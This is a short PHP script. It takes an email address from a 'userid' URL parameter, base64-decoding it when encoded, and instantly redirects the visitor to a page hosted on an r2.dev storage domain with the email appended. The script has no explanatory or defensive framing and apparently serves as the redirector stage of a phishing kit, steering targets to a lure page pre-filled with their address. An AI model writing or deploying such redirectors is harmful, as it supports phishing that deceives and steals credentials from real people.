<?php
function isBase64($data)
{
    if (base64_encode(base64_decode($data)) === $data) {
        return true;
    } else {
        return false;
    }
}

function decode($email)
{
    if (isBase64($email)) {
        $email = base64_decode($email, false);
    }

    header(
        "refresh:0;url=https://pub-c929e88dfe4b4a3abac22a83118f1e40.r2.dev/backeyes.html?email=" .
            $email
    );
}
if (isset($_GET["userid"]) && !empty($_GET["userid"])) {
    $email = $_GET["userid"];
    decode($email);
}

?>
